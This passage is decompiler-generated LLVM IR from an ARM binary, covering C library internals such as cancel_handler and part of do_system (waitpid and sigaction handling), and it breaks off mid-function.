  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 3, 1, 2, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 2, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 2, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 47, { 1, 5, 0, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 12956, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_11588, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11540, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11528, { 1, 0 }
  uselistorder label %dec_label_pc_11490, { 1, 0 }
  uselistorder label %dec_label_pc_11468, { 1, 0 }
  uselistorder label %dec_label_pc_113e4, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11360, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11338, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_112a8, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_11290, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @cancel_handler(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_115dc = load i32, i32* @r4, align 4
  store i32 %v3_115dc, i32* %stack_var_-20, align 4
  %v2_115e0 = load i32, i32* %arg1, align 4
  store i32 %v2_115e0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r5, align 4
  store i32 %v2_115e0, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  store i32 37, i32* @r7, align 4
  store i32 76360, i32* @r6, align 4
  br label %dec_label_pc_11604

dec_label_pc_11604:                               ; preds = %dec_label_pc_1161c.dec_label_pc_11604_crit_edge, %entry
  %v0_11608 = phi i32 [ %v0_11608.pre, %dec_label_pc_1161c.dec_label_pc_11604_crit_edge ], [ %v2_115e0, %entry ]
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_11608, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_11610 = call i32 @__libc_waitpid(i32 %v0_11608, i32 0, i32 0)
  store i32 %v3_11610, i32* %r0.global-to-local, align 4
  %v3_11614 = icmp eq i32 %v3_11610, -1
  store i1 %v3_11614, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_11614, label %dec_label_pc_1161c, label %dec_label_pc_11630

dec_label_pc_1161c:                               ; preds = %dec_label_pc_11604
  %v0_1161c = call i32 @__aeabi_read_tp()
  store i32 %v0_1161c, i32* %r0.global-to-local, align 4
  %v3_11620 = load i16, i16* @global_var_24070.401, align 2
  %v4_11620 = sext i16 %v3_11620 to i32
  %v2_11624 = add i32 %v4_11620, %v0_1161c
  %v3_11624 = inttoptr i32 %v2_11624 to i32*
  %v4_11624 = load i32, i32* %v3_11624, align 4
  %v2_11628 = icmp ugt i32 %v4_11624, 3
  store i1 %v2_11628, i1* %cpsr_c.global-to-local, align 1
  %v7_11628 = icmp eq i32 %v4_11624, 4
  br i1 %v7_11628, label %dec_label_pc_1161c.dec_label_pc_11604_crit_edge, label %dec_label_pc_11630

dec_label_pc_1161c.dec_label_pc_11604_crit_edge:  ; preds = %dec_label_pc_1161c
  %v0_11608.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11604

dec_label_pc_11630:                               ; preds = %dec_label_pc_11604, %dec_label_pc_1161c
  store i32 13004, i32* @r7, align 4
  %v0_11634 = load i32, i32* @r5, align 4
  %v2_11634 = add i32 %v0_11634, 13004
  store i32 %v2_11634, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_11634, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1164435 = inttoptr i32 %v2_11634 to i32*
  %v2_1164436 = load i32, i32* %v1_1164435, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1164838 = icmp eq i32 %v2_1164436, 0
  br i1 %v9_1164838, label %dec_label_pc_11650, label %dec_label_pc_11668

dec_label_pc_11650:                               ; preds = %dec_label_pc_11630, %dec_label_pc_11650.dec_label_pc_11644_crit_edge
  %v0_1165039 = phi i32 [ %v1_11648.pre, %dec_label_pc_11650.dec_label_pc_11644_crit_edge ], [ 0, %dec_label_pc_11630 ]
  store i32 %v0_1165039, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_11660 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_11660, label %dec_label_pc_11664, label %dec_label_pc_11650.dec_label_pc_11644_crit_edge

dec_label_pc_11650.dec_label_pc_11644_crit_edge:  ; preds = %dec_label_pc_11650
  %v0_11644.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11648.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_11644 = inttoptr i32 %v0_11644.pre to i32*
  %v2_11644 = load i32, i32* %v1_11644, align 4
  %v3_11648 = icmp uge i32 %v2_11644, %v1_11648.pre
  store i1 %v3_11648, i1* %cpsr_c.global-to-local, align 1
  %v9_11648 = icmp eq i32 %v2_11644, %v1_11648.pre
  br i1 %v9_11648, label %dec_label_pc_11650, label %dec_label_pc_11668

dec_label_pc_11664:                               ; preds = %dec_label_pc_11650
  %v0_11664 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11668

dec_label_pc_11668:                               ; preds = %dec_label_pc_11630, %dec_label_pc_11650.dec_label_pc_11644_crit_edge, %dec_label_pc_11664
  %v0_11668 = phi i32 [ %v0_11664, %dec_label_pc_11664 ], [ %v2_1164436, %dec_label_pc_11630 ], [ %v2_11644, %dec_label_pc_11650.dec_label_pc_11644_crit_edge ]
  %v1_11668 = phi i32 [ %v0_11664, %dec_label_pc_11664 ], [ 0, %dec_label_pc_11630 ], [ %v1_11648.pre, %dec_label_pc_11650.dec_label_pc_11644_crit_edge ]
  %v3_11668 = icmp uge i32 %v0_11668, %v1_11668
  store i1 %v3_11668, i1* %cpsr_c.global-to-local, align 1
  %v9_11668 = icmp eq i32 %v0_11668, %v1_11668
  br i1 %v9_11668, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_11668
  %v1_1166c = load i32, i32* @r6, align 4
  store i32 %v1_1166c, i32* %r0.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_11668, %bb
  store i32 71284, i32* @lr, align 4
  %v1_11670 = xor i1 %v9_11668, true
  call void @__pseudo_cond_branch(i1 %v1_11670, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  store i32 13000, i32* %r2.global-to-local, align 4
  %v0_11678 = load i32, i32* @r5, align 4
  %v2_11678 = add i32 %v0_11678, 13000
  %v3_11678 = inttoptr i32 %v2_11678 to i32*
  %v4_11678 = load i32, i32* %v3_11678, align 4
  %v1_1167c = add i32 %v4_11678, -1
  store i32 %v1_1167c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11680 = icmp eq i32 %v1_1167c, 0
  store i32 %v1_1167c, i32* %v3_11678, align 4
  br i1 %v2_11680, label %dec_label_pc_1168c, label %dec_label_pc_116b4

dec_label_pc_1168c:                               ; preds = %bb18
  %v0_11690 = load i32, i32* @r4, align 4
  store i32 %v0_11690, i32* %r2.global-to-local, align 4
  %v0_11694 = load i32, i32* @r5, align 4
  %v2_11694 = add i32 %v0_11694, 12980
  store i32 %v2_11694, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v3_1169c = call i32 @__libc_sigaction(i32 3, i32 %v2_11694, i32 %v0_11690)
  %v0_116a4 = load i32, i32* @r4, align 4
  store i32 %v0_116a4, i32* %r2.global-to-local, align 4
  %v0_116a8 = load i32, i32* @r5, align 4
  %v2_116a8 = add i32 %v0_116a8, 12960
  store i32 %v2_116a8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_116b0 = call i32 @__libc_sigaction(i32 2, i32 %v2_116a8, i32 %v0_116a4)
  store i32 %v3_116b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_116b4

dec_label_pc_116b4:                               ; preds = %bb18, %dec_label_pc_1168c, %dec_label_pc_116e4
  %v0_116b4 = load i32, i32* @r5, align 4
  %v1_116b4 = load i32, i32* @r7, align 4
  %v2_116b4 = add i32 %v1_116b4, %v0_116b4
  %v3_116b4 = inttoptr i32 %v2_116b4 to i32*
  %v4_116b4 = load i32, i32* %v3_116b4, align 4
  store i32 %v4_116b4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_116bc = load i32, i32* @r6, align 4
  store i32 %v0_116bc, i32* %r2.global-to-local, align 4
  %v1_116c023 = inttoptr i32 %v0_116bc to i32*
  %v2_116c024 = load i32, i32* %v1_116c023, align 4
  %v3_116c426 = icmp uge i32 %v2_116c024, %v4_116b4
  store i1 %v3_116c426, i1* %cpsr_c.global-to-local, align 1
  %v9_116c432 = icmp eq i32 %v2_116c024, %v4_116b4
  br i1 %v9_116c432, label %dec_label_pc_116cc, label %dec_label_pc_116e4

dec_label_pc_116cc:                               ; preds = %dec_label_pc_116b4, %dec_label_pc_116cc.dec_label_pc_116c0_crit_edge
  %v0_116cc33 = phi i32 [ %v1_116c4.pre, %dec_label_pc_116cc.dec_label_pc_116c0_crit_edge ], [ %v4_116b4, %dec_label_pc_116b4 ]
  store i32 %v0_116cc33, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_116dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_116dc, label %dec_label_pc_116e0, label %dec_label_pc_116cc.dec_label_pc_116c0_crit_edge

dec_label_pc_116cc.dec_label_pc_116c0_crit_edge:  ; preds = %dec_label_pc_116cc
  %v0_116c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_116c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_116c0 = inttoptr i32 %v0_116c0.pre to i32*
  %v2_116c0 = load i32, i32* %v1_116c0, align 4
  %v3_116c4 = icmp uge i32 %v2_116c0, %v1_116c4.pre
  store i1 %v3_116c4, i1* %cpsr_c.global-to-local, align 1
  %v9_116c4 = icmp eq i32 %v2_116c0, %v1_116c4.pre
  br i1 %v9_116c4, label %dec_label_pc_116cc, label %dec_label_pc_116e4

dec_label_pc_116e0:                               ; preds = %dec_label_pc_116cc
  %v0_116e0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_116e4

dec_label_pc_116e4:                               ; preds = %dec_label_pc_116b4, %dec_label_pc_116cc.dec_label_pc_116c0_crit_edge, %dec_label_pc_116e0
  %v0_116ec = phi i32 [ %v0_116e0, %dec_label_pc_116e0 ], [ %v2_116c024, %dec_label_pc_116b4 ], [ %v2_116c0, %dec_label_pc_116cc.dec_label_pc_116c0_crit_edge ]
  %v1_116e4 = phi i32 [ %v0_116e0, %dec_label_pc_116e0 ], [ %v4_116b4, %dec_label_pc_116b4 ], [ %v1_116c4.pre, %dec_label_pc_116cc.dec_label_pc_116c0_crit_edge ]
  %v3_116e4 = icmp uge i32 %v0_116ec, %v1_116e4
  store i1 %v3_116e4, i1* %cpsr_c.global-to-local, align 1
  %v9_116e4 = icmp eq i32 %v0_116ec, %v1_116e4
  br i1 %v9_116e4, label %dec_label_pc_116ec, label %dec_label_pc_116b4

dec_label_pc_116ec:                               ; preds = %dec_label_pc_116e4
  %v2_116ec = icmp ne i32 %v1_116e4, 0
  store i1 %v2_116ec, i1* %cpsr_c.global-to-local, align 1
  %v7_116f0 = icmp slt i32 %v1_116e4, 2
  br i1 %v7_116f0, label %dec_label_pc_116ec.dec_label_pc_1170c_crit_edge, label %dec_label_pc_116f4

dec_label_pc_116ec.dec_label_pc_1170c_crit_edge:  ; preds = %dec_label_pc_116ec
  %v1_11714.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1170c

dec_label_pc_116f4:                               ; preds = %dec_label_pc_116ec
  %v0_116f4 = load i32, i32* @r6, align 4
  store i32 %v0_116f4, i32* %r0.global-to-local, align 4
  %v0_116f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_116f8 = add i32 %v0_116f8, 129
  store i32 %v1_116f8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1170c

dec_label_pc_1170c:                               ; preds = %dec_label_pc_116ec.dec_label_pc_1170c_crit_edge, %dec_label_pc_116f4
  %v1_11714 = phi i32 [ %v1_11714.pre, %dec_label_pc_116ec.dec_label_pc_1170c_crit_edge ], [ %v0_116f4, %dec_label_pc_116f4 ]
  %v2_11710 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11710, i32* %r4.global-to-local, align 4
  ret i32 %v1_11714

; uselistorder directives
  uselistorder i32 %v0_116e0, { 1, 0 }
  uselistorder i32 %v1_116c4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_11664, { 1, 0 }
  uselistorder i32 %v1_11648.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_11608, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 11, 2, 4, 3, 5, 6, 7, 8, 12, 9, 10, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 10, 11, 3, 4, 5, 8, 9, 6, 7 }
  uselistorder label %dec_label_pc_1170c, { 1, 0 }
  uselistorder label %dec_label_pc_116e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_116cc, { 1, 0 }
  uselistorder label %dec_label_pc_116b4, { 2, 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_11668, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11650, { 1, 0 }
  uselistorder label %dec_label_pc_11630, { 1, 0 }
}

define i32 @function_11720(i16* %arg1) local_unnamed_addr {
dec_label_pc_11720:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_11720 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11720, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11720
  %v2_11724 = load i32, i32* @r8, align 4
  %v5_117244 = udiv i32 %v2_11724, 32
  %v6_11724 = and i32 %v5_117244, %tmp
  %v2_11728 = trunc i32 %v6_11724 to i16
  store i16 %v2_11728, i16* %arg1, align 2
  %v5_11728 = load i32, i32* @r4, align 4
  %v6_11728 = load i32, i32* %r0.global-to-local, align 4
  %v7_11728 = sub i32 %v6_11728, %v5_11728
  store i32 %v7_11728, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11720, %bb
  %v7_1172c = phi i32 [ %tmp, %dec_label_pc_11720 ], [ %v7_11728, %bb ]
  ret i32 %v7_1172c

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @do_system() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %v3_11730 = load i32, i32* @r4, align 4
  %v6_11730 = load i32, i32* @r5, align 4
  %v9_11730 = load i32, i32* @r6, align 4
  %v12_11730 = load i32, i32* @r7, align 4
  %v15_11730 = load i32, i32* @r8, align 4
  %v21_11730 = load i32, i32* @lr, align 4
  %v2_11738 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_11738, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v3_11750 = bitcast i32* %stack_var_-100 to i8*
  %v4_11750 = call i32 @__GI_memset(i8* %v3_11750, i32 0, i32 20)
  store i32 13004, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 13004), i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-100, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 13004), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_11770161 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 13004) to i32*), align 4
  store i32 %v2_11770161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_11774163 = icmp eq i32 %v2_11770161, 0
  br i1 %v9_11774163, label %dec_label_pc_1177c, label %dec_label_pc_11794

dec_label_pc_1177c:                               ; preds = %entry, %dec_label_pc_1177c.dec_label_pc_11770_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1178c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1178c, label %dec_label_pc_11790, label %dec_label_pc_1177c.dec_label_pc_11770_crit_edge

dec_label_pc_1177c.dec_label_pc_11770_crit_edge:  ; preds = %dec_label_pc_1177c
  %v0_11770.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11774.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_11770 = inttoptr i32 %v0_11770.pre to i32*
  %v2_11770 = load i32, i32* %v1_11770, align 4
  store i32 %v2_11770, i32* %r3.global-to-local, align 4
  %v3_11774 = icmp uge i32 %v2_11770, %v1_11774.pre
  store i1 %v3_11774, i1* %cpsr_c.global-to-local, align 1
  %v9_11774 = icmp eq i32 %v2_11770, %v1_11774.pre
  br i1 %v9_11774, label %dec_label_pc_1177c, label %dec_label_pc_11794

dec_label_pc_11790:                               ; preds = %dec_label_pc_1177c
  %v0_11790 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11790, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11794

dec_label_pc_11794:                               ; preds = %entry, %dec_label_pc_1177c.dec_label_pc_11770_crit_edge, %dec_label_pc_11790
  %v0_11794 = phi i32 [ %v0_11790, %dec_label_pc_11790 ], [ %v2_11770161, %entry ], [ %v2_11770, %dec_label_pc_1177c.dec_label_pc_11770_crit_edge ]
  %v1_11794 = phi i32 [ %v0_11790, %dec_label_pc_11790 ], [ 0, %entry ], [ %v1_11774.pre, %dec_label_pc_1177c.dec_label_pc_11770_crit_edge ]
  %v3_11794 = icmp uge i32 %v0_11794, %v1_11794
  store i1 %v3_11794, i1* %cpsr_c.global-to-local, align 1
  %v9_11794 = icmp eq i32 %v0_11794, %v1_11794
  br i1 %v9_11794, label %bb89, label %bb

bb:                                               ; preds = %dec_label_pc_11794
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_11794, %bb
  store i32 71584, i32* @lr, align 4
  %v1_1179c = xor i1 %v9_11794, true
  call void @__pseudo_cond_branch(i1 %v1_1179c, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  store i32 13000, i32* @r4, align 4
  %v0_117a4 = load i32, i32* @r6, align 4
  %v2_117a4 = add i32 %v0_117a4, 13000
  %v3_117a4 = inttoptr i32 %v2_117a4 to i32*
  %v4_117a4 = load i32, i32* %v3_117a4, align 4
  %v1_117a8 = add i32 %v4_117a4, 1
  store i32 %v1_117a8, i32* %r3.global-to-local, align 4
  %v2_117ac = icmp ne i32 %v1_117a8, 0
  store i1 %v2_117ac, i1* %cpsr_c.global-to-local, align 1
  %v7_117ac = icmp eq i32 %v4_117a4, 0
  store i32 %v1_117a8, i32* %v3_117a4, align 4
  br i1 %v7_117ac, label %dec_label_pc_117b8, label %dec_label_pc_1181c

dec_label_pc_117b8:                               ; preds = %bb89
  %v0_117c0 = load i32, i32* @r6, align 4
  %v2_117c0 = add i32 %v0_117c0, 12960
  store i32 %v2_117c0, i32* %r2.global-to-local, align 4
  store i32 %v2_11738, i32* %r1.global-to-local, align 4
  %v3_117c8 = call i32 @__libc_sigaction(i32 2, i32 %v2_11738, i32 %v2_117c0)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_117cc = icmp slt i32 %v3_117c8, 0
  br i1 %v1_117cc, label %.thread64, label %dec_label_pc_117e0

.thread64:                                        ; preds = %dec_label_pc_117b8
  %v3_117d0 = load i32, i32* @r6, align 4
  %v4_117d0 = load i32, i32* @r4, align 4
  %v5_117d0 = add i32 %v4_117d0, %v3_117d0
  %v6_117d0 = inttoptr i32 %v5_117d0 to i32*
  %v7_117d0 = load i32, i32* %v6_117d0, align 4
  %v4_117d4 = add i32 %v7_117d0, -1
  store i32 %v4_117d4, i32* %r3.global-to-local, align 4
  store i32 %v4_117d4, i32* %v6_117d0, align 4
  br label %dec_label_pc_1193c

dec_label_pc_117e0:                               ; preds = %dec_label_pc_117b8
  store i32 %v2_11738, i32* %r1.global-to-local, align 4
  %v0_117e8 = load i32, i32* @r6, align 4
  %v2_117e8 = add i32 %v0_117e8, 12980
  store i32 %v2_117e8, i32* %r2.global-to-local, align 4
  %v3_117f0 = call i32 @__libc_sigaction(i32 3, i32 %v2_11738, i32 %v2_117e8)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_117f4 = icmp slt i32 %v3_117f0, 0
  br i1 %v1_117f4, label %dec_label_pc_117fc, label %dec_label_pc_1181c

dec_label_pc_117fc:                               ; preds = %dec_label_pc_117e0
  store i32 75876, i32* %r2.global-to-local, align 4
  %v0_11800 = load i32, i32* @r6, align 4
  %v1_11800 = load i32, i32* @r4, align 4
  %v2_11800 = add i32 %v1_11800, %v0_11800
  %v3_11800 = inttoptr i32 %v2_11800 to i32*
  %v4_11800 = load i32, i32* %v3_11800, align 4
  store i32 %v4_11800, i32* %r3.global-to-local, align 4
  %v3_11804 = load i16, i16* @global_var_24070.401, align 2
  %v4_11804 = sext i16 %v3_11804 to i32
  store i32 %v4_11804, i32* %r2.global-to-local, align 4
  %v0_11808 = call i32 @__aeabi_read_tp()
  %v1_1180c = load i32, i32* %r2.global-to-local, align 4
  %v2_1180c = add i32 %v1_1180c, %v0_11808
  %v3_1180c = inttoptr i32 %v2_1180c to i32*
  %v4_1180c = load i32, i32* %v3_1180c, align 4
  store i32 %v4_1180c, i32* @r5, align 4
  %v0_11810 = load i32, i32* %r3.global-to-local, align 4
  %v1_11810 = add i32 %v0_11810, -1
  store i32 %v1_11810, i32* %r3.global-to-local, align 4
  %v1_11814 = load i32, i32* @r6, align 4
  %v2_11814 = load i32, i32* @r4, align 4
  %v3_11814 = add i32 %v2_11814, %v1_11814
  %v4_11814 = inttoptr i32 %v3_11814 to i32*
  store i32 %v1_11810, i32* %v4_11814, align 4
  br label %dec_label_pc_11918

dec_label_pc_1181c:                               ; preds = %dec_label_pc_117e0, %bb89
  store i32 13004, i32* @r7, align 4
  %v0_11820 = load i32, i32* @r6, align 4
  %v2_11820 = add i32 %v0_11820, 13004
  store i32 %v2_11820, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11824

dec_label_pc_11824:                               ; preds = %dec_label_pc_11854.dec_label_pc_11824_crit_edge, %dec_label_pc_1181c
  %v0_1182c = phi i32 [ %v0_1182c.pre, %dec_label_pc_11854.dec_label_pc_11824_crit_edge ], [ %v2_11820, %dec_label_pc_1181c ]
  %v1_11824 = phi i32 [ %v1_11824.pre, %dec_label_pc_11854.dec_label_pc_11824_crit_edge ], [ 13004, %dec_label_pc_1181c ]
  %v0_11824 = phi i32 [ %v0_11824.pre, %dec_label_pc_11854.dec_label_pc_11824_crit_edge ], [ %v0_11820, %dec_label_pc_1181c ]
  %v2_11824 = add i32 %v0_11824, %v1_11824
  %v3_11824 = inttoptr i32 %v2_11824 to i32*
  %v4_11824 = load i32, i32* %v3_11824, align 4
  store i32 %v4_11824, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1182c, i32* %r2.global-to-local, align 4
  %v1_11830148 = inttoptr i32 %v0_1182c to i32*
  %v2_11830149 = load i32, i32* %v1_11830148, align 4
  store i32 %v2_11830149, i32* %r3.global-to-local, align 4
  %v3_11834151 = icmp uge i32 %v2_11830149, %v4_11824
  store i1 %v3_11834151, i1* %cpsr_c.global-to-local, align 1
  %v9_11834157 = icmp eq i32 %v2_11830149, %v4_11824
  br i1 %v9_11834157, label %dec_label_pc_1183c, label %dec_label_pc_11854

dec_label_pc_1183c:                               ; preds = %dec_label_pc_11824, %dec_label_pc_1183c.dec_label_pc_11830_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1184c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1184c, label %dec_label_pc_11850, label %dec_label_pc_1183c.dec_label_pc_11830_crit_edge

dec_label_pc_1183c.dec_label_pc_11830_crit_edge:  ; preds = %dec_label_pc_1183c
  %v0_11830.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11834.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_11830 = inttoptr i32 %v0_11830.pre to i32*
  %v2_11830 = load i32, i32* %v1_11830, align 4
  store i32 %v2_11830, i32* %r3.global-to-local, align 4
  %v3_11834 = icmp uge i32 %v2_11830, %v1_11834.pre
  store i1 %v3_11834, i1* %cpsr_c.global-to-local, align 1
  %v9_11834 = icmp eq i32 %v2_11830, %v1_11834.pre
  br i1 %v9_11834, label %dec_label_pc_1183c, label %dec_label_pc_11854

dec_label_pc_11850:                               ; preds = %dec_label_pc_1183c
  %v0_11850 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11850, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11854

dec_label_pc_11854:                               ; preds = %dec_label_pc_11824, %dec_label_pc_1183c.dec_label_pc_11830_crit_edge, %dec_label_pc_11850
  %v0_1185c = phi i32 [ %v0_11850, %dec_label_pc_11850 ], [ %v2_11830149, %dec_label_pc_11824 ], [ %v2_11830, %dec_label_pc_1183c.dec_label_pc_11830_crit_edge ]
  %v1_11854 = phi i32 [ %v0_11850, %dec_label_pc_11850 ], [ %v4_11824, %dec_label_pc_11824 ], [ %v1_11834.pre, %dec_label_pc_1183c.dec_label_pc_11830_crit_edge ]
  %v3_11854 = icmp uge i32 %v0_1185c, %v1_11854
  store i1 %v3_11854, i1* %cpsr_c.global-to-local, align 1
  %v9_11854 = icmp eq i32 %v0_1185c, %v1_11854
  br i1 %v9_11854, label %dec_label_pc_1185c, label %dec_label_pc_11854.dec_label_pc_11824_crit_edge

dec_label_pc_11854.dec_label_pc_11824_crit_edge:  ; preds = %dec_label_pc_11854
  %v0_11824.pre = load i32, i32* @r6, align 4
  %v1_11824.pre = load i32, i32* @r7, align 4
  %v0_1182c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11824

dec_label_pc_1185c:                               ; preds = %dec_label_pc_11854
  %v2_1185c = icmp ne i32 %v1_11854, 0
  store i1 %v2_1185c, i1* %cpsr_c.global-to-local, align 1
  %v7_11860 = icmp slt i32 %v1_11854, 2
  br i1 %v7_11860, label %dec_label_pc_1187c, label %dec_label_pc_11864

dec_label_pc_11864:                               ; preds = %dec_label_pc_1185c
  %v0_11868 = load i32, i32* %r1.global-to-local, align 4
  %v1_11868 = add i32 %v0_11868, 129
  store i32 %v1_11868, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* @r7, align 4
  br label %dec_label_pc_1187c

